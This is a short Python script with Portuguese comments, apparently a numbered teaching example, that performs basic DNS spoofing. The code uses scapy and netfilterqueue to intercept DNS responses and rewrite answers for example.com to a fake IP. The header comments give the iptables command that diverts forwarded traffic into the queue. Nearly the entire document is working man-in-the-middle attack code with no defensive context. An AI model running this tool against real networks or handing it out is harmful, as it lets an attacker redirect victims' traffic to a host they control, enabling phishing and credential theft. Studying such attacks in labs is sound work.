# Exemplo 4: DNS Spoof básico (responde com IP falso para domínio específico)
# Obs: Para rodar, precisa redirecionar o tráfego DNS para a fila NFQUEUE:
# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
# Também precisa do pacote python3-netfilterqueue.


from scapy.all import *
import netfilterqueue

FAKE_IP = "192.168.1.123"

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname.decode()
        if "example.com" in qname:
            print(f"[+] Spoofando DNS para {qname}")
            answer = DNSRR(rrname=scapy_packet[DNSQR].qname, rdata=FAKE_IP)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
print("[*] Rodando DNS spoof, pressione CTRL+C para sair")
queue.run()
